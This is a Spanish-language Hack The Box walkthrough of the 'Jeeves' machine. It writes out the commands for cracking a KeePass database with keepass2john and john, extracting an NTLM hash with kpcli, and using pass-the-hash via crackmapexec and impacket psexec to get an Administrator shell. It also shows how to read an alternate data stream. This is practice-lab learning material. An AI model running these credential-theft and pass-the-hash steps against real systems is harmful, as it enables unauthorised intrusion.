# Jeeves-HTB


## NMAP 

![image](https://github.com/gecr07/Jeeves-HTB/assets/63270579/80858071-c2b7-4e78-b9b7-45587dc34548)

el puerto 80 es un rabbit hole

## RCE

Buscamos en hacktricks lo mas comun de jenkins y lo que vimos es que se pueden ejecutar comandos de varias maneras...

![image](https://github.com/gecr07/Jeeves-HTB/assets/63270579/3be34640-d0fb-4f22-9dc3-657502160678)


### Windows exploit suggester Next generation

WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.

> https://github.com/bitsadmin/wesng

Tiene la capacidad de con el output del systeminfo genera las vulns pero da muchos falsos positivos.

## Priv esca

Buscando tenemos un archivo de keepass ***.kdbx***

```
keepass2john CEH.kdbx

john -w=/usr/share/wordlists/rockyou.txt hash

```

Vamos a usar el keepass cli instalalo en kali como cualquier paquete.


```
kpcli --kdb CEH.kdbx
## Buscar todo los pass
find .
# mostramos dependiendo del numero 
 show -f 0
```

![image](https://github.com/gecr07/Jeeves-HTB/assets/63270579/40423b6b-98f1-4120-9165-999406ac0309)

Buscando todas las credenciales encontramos un hash que parece ser ntlm

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

```

Solo como cultura la primera parte es el hash del espacio en blanco (aad3b435b51404eeaad3b435b51404ee). Con crackmapexec podemos probar con pass the hash a ver si es el hash del Administrator.

![image](https://github.com/gecr07/Jeeves-HTB/assets/63270579/7ede367e-3870-4215-9e41-0d764c1ee281)


```
crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
/usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.16.56 cmd.exe
```


## Alternative data streams

![image](https://github.com/gecr07/Jeeves-HTB/assets/63270579/6edd59cf-330a-4f51-810d-14e8c3ede5b6)


Es una manera de esconder cosas y se ve algo como esto:


Para listar este tipo de archivos

```
dir /R
more < hm.txt:root.txt

```


































